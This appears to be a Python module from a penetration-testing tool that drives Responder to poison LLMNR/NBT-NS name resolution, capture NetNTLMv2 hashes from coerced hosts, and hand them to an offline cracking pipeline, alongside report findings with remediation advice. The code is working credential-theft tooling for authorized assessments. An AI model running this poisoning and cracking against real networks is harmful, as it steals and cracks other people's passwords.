"""NetNTLMv2 capture via Responder — the intrusive, opt-in poisoning feature.

This is *not* part of `scan` and never runs by default. It drives **Responder**
(LLMNR/NBT-NS/mDNS poisoning) as a long-running listener on one interface, captures
NetNTLMv2 hashes from coerced hosts, and normalizes them into `Finding`s — then hands
them to the existing loot/crack pipeline (`crack.py`, which maps `netntlmv2` -> hashcat
5600 / john netntlmv2). See docs/NETNTLM.md.

Design mirrors the rest of the codebase: the parsing (engines/responder.py) and the
findings-building (`build_findings` below) are pure and unit-tested; only `run_poison`
touches a subprocess, and it takes an injectable line source / `popen` so tests never
need Responder, root, or a LAN.

Legal/ethics: poisoning coerces authentication from *other machines* on the segment.
Authorized, in-scope engagements only — the CLI gates this behind a confirmation prompt.
"""
from __future__ import annotations

import subprocess
import threading
from typing import Iterable, Optional

from .crack import CrackResult, run_cracking
from .events import Event, EventBus, EventKind
from .engines.responder import parse_responder_log, responder_argv
from .findings import Category, Evidence, Finding, Report, Severity

_ATTACK_REF = "https://attack.mitre.org/techniques/T1557/001/"


# --------------------------------------------------------------------------- #
# Pure findings-building (unit-testable)                                       #
# --------------------------------------------------------------------------- #
def build_findings(pairs: list[tuple[str, str]], *, poisoned: bool) -> list[Finding]:
    """Turn captured (account, netntlmv2_hash) pairs into normalized Findings.

    `poisoned` = poisoning was active (not analyze mode) and at least one host took
    the bait — i.e. LLMNR/NBT-NS poisoning is demonstrably possible on this segment.
    Captured hashes ride in `meta["hashes"]` (type ``netntlmv2``) so crack.py's
    collect/loot/crack pipeline picks them up with no further changes.
    """
    findings: list[Finding] = []
    if not pairs:
        return findings

    accounts = sorted({acct for acct, _ in pairs})
    hashes = [{"account": acct, "hash": h, "type": "netntlmv2"} for acct, h in pairs]
    findings.append(Finding(
        id="netntlm-captured",
        title="NetNTLMv2 hashes captured via LLMNR/NBT-NS poisoning",
        severity=Severity.HIGH,
        category=Category.SMB,
        description=f"Captured {len(pairs)} NetNTLMv2 authentication hash(es) from "
                    f"{len(accounts)} account(s) coerced into authenticating to the poisoner.",
        impact="NetNTLMv2 hashes can be cracked offline to recover plaintext passwords, or "
               "relayed to other services (where SMB signing is not enforced) for immediate "
               "authenticated access.",
        remediation="Disable LLMNR (GPO: 'Turn off multicast name resolution') and NBT-NS "
                    "(DHCP option 001 / per-adapter setting); enforce SMB signing; segment the "
                    "network to limit broadcast name resolution.",
        affected=accounts,
        evidence=[Evidence(source="responder", detail=f"{len(pairs)} NetNTLMv2 hash(es) captured")],
        references=[_ATTACK_REF],
        credentialed=False,
        meta={"hashes": hashes},
    ))

    if poisoned:
        findings.append(Finding(
            id="llmnr-nbtns-poisoning-possible",
            title="LLMNR / NBT-NS name-resolution poisoning possible",
            severity=Severity.MEDIUM,
            category=Category.SMB,
            description="Hosts on the local segment accepted spoofed LLMNR/NBT-NS responses, "
                        "resolving names to the attacker and authenticating to it.",
            impact="An attacker on the segment can coerce NetNTLMv2 authentication and stage "
                   "relay attacks against hosts that do not require SMB signing.",
            remediation="Disable LLMNR and NBT-NS via GPO/DHCP and prefer DNS; enforce SMB "
                        "signing; monitor for rogue name-resolution responders.",
            affected=accounts,
            evidence=[Evidence(source="responder",
                               detail="spoofed name resolution answered by victim host(s)")],
            references=[_ATTACK_REF],
            credentialed=False,
        ))
    return findings


# --------------------------------------------------------------------------- #
# Subprocess streaming (impure — time-boxed Responder stdout)                  #
# --------------------------------------------------------------------------- #
def _terminate(proc) -> None:
    try:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()
    except Exception:
        pass


def _stream_responder(argv: list[str], duration: int, *,
                      popen=subprocess.Popen) -> Iterable[str]:
    """Yield Responder's stdout lines, terminating it after `duration` seconds.

    A watchdog timer stops the process so the run is strictly time-boxed even if no
    traffic arrives; the stdout iterator then ends and the generator returns.
    """
    proc = popen(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                 text=True, bufsize=1)
    timer = threading.Timer(duration, _terminate, args=(proc,))
    timer.daemon = True
    timer.start()
    try:
        if proc.stdout is not None:
            for line in proc.stdout:
                yield line.rstrip("\n")
    finally:
        timer.cancel()
        _terminate(proc)


# --------------------------------------------------------------------------- #
# Orchestration                                                                #
# --------------------------------------------------------------------------- #
def _emit(bus: Optional[EventBus], kind: EventKind, **data) -> None:
    if bus is not None:
        bus.publish(Event(kind=kind, data=data, engine="poison"))


def run_poison(
    iface: str,
    *,
    duration: int = 600,
    analyze: bool = False,
    bus: Optional[EventBus] = None,
    engagement: str = "REDNESS NetNTLMv2 capture",
    loot_dir: str = "loot",
    wordlist: Optional[str] = None,
    lines: Optional[Iterable[str]] = None,
    popen=subprocess.Popen,
) -> tuple[Report, CrackResult]:
    """Run Responder (or consume an injected `lines` source) and build a Report.

    Captures stream to `bus` (attacker/account nodes + "poisoned" edges + findings) for
    the live graph, then loot/crack runs exactly as for the other engines. Returns the
    aggregated Report and the CrackResult. `lines`/`popen` are injectable for tests.
    """
    report = Report(engagement=engagement, target=f"local segment via {iface}")
    _emit(bus, EventKind.STATUS,
          message=f"poison start on {iface} (analyze={analyze}, {duration}s)")
    root = f"poison:{iface}"
    _emit(bus, EventKind.NODE, id=root, label=f"Responder ({iface})", type="host")

    if lines is None:
        argv = responder_argv(iface, analyze=analyze)
        try:
            lines = _stream_responder(argv, duration, popen=popen)
        except FileNotFoundError:
            _emit(bus, EventKind.STATUS, message="responder not found on PATH — nothing captured")
            return report, CrackResult()

    seen: set[str] = set()
    pairs: list[tuple[str, str]] = []
    try:
        for line in lines:
            for account, h in parse_responder_log(line):
                if h in seen:
                    continue
                seen.add(h)
                pairs.append((account, h))
                _emit(bus, EventKind.NODE, id=account, label=account, type="user")
                _emit(bus, EventKind.EDGE, src=root, dst=account, label="poisoned")
                _emit(bus, EventKind.STATUS, message=f"captured NetNTLMv2 for {account}")
    except KeyboardInterrupt:
        _emit(bus, EventKind.STATUS, message="interrupted — finalizing captures")

    poisoned = (not analyze) and bool(pairs)
    report.findings = build_findings(pairs, poisoned=poisoned)
    for f in report.findings:
        _emit(bus, EventKind.FINDING, finding=f.to_dict())

    # Loot + optional cracking — netntlmv2 is already mapped in crack.py (step 2).
    result = run_cracking(report, loot_dir=loot_dir, wordlist=wordlist)
    _emit(bus, EventKind.DONE, engine="poison")
    return report, result
